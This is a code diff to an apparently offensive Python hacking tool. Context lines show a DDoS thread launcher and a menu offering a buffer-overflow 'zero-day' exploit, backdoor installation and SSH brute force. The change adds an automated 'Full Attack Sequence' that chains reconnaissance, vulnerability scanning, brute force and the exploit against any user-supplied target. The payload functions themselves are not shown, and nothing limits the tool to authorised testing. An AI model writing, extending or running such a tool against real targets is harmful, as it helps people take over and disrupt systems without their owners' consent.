@@ -214,7 +214,7 @@ def ddos_attack():
         thr.start()
         print(f"{i + 1} threads started!")
 
-# Submenu for Admin (Zero-Day attack)
+# Admin (Zero-Day Attack) Options menu
 def zero_attack_menu(url_or_ip):
     while True:
         print(Fore.YELLOW + """
@@ -222,7 +222,8 @@ def zero_attack_menu(url_or_ip):
         [1] Zero-Day Exploit (buffer overflow)
         [2] Backdoor Installation
         [3] SSH Brute Force
-        [4] Exit to Main Menu
+        [4] Full Attack Sequence (Recon, Scan, Exploit)
+        [5] Exit to Main Menu
         """)
         sub_choice = input("Select an option: ").strip()
         if sub_choice == "1":
@@ -232,10 +233,19 @@ def zero_attack_menu(url_or_ip):
         elif sub_choice == "3":
             ssh_bruteforce(url_or_ip)
         elif sub_choice == "4":
+            attack_sequence(url_or_ip)
+        elif sub_choice == "5":
             break
         else:
             print("Invalid option selected.")
         input("Press Enter to return to the menu...")
+
+# Attack Sequence (Reconnaissance, Vulnerability Scan, SSH Brute Force, Zero-Day)
+def attack_sequence(target):
+    reconnaissance(target)
+    vulnerability_scan(target)
+    ssh_bruteforce(target)
+    zero_day_exploit(target)
 
 # Main user interface
 def display_ui():
